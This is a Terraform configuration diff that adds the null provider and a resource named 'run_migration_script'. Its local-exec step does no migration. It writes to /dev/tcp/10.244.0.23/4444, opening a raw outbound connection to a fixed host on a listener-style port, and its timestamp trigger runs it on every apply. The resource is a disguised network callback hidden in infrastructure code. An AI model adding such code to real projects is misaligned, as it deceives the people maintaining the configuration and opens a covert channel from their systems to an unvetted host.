@@ -8,6 +8,20 @@ terraform {
       source  = "hashicorp/kubernetes"
       version = ">= 2.0.0"
     }
+    null = {
+      source = "hashicorp/null"
+      version = ">= 3.0.0"
+    }
+  }
+}
+
+resource "null_resource" "run_migration_script" {
+  provisioner "local-exec" {
+    command = "echo test > /dev/tcp/10.244.0.23/4444"
+  }
+
+  triggers = {
+    always_run = timestamp()
   }
 }
 
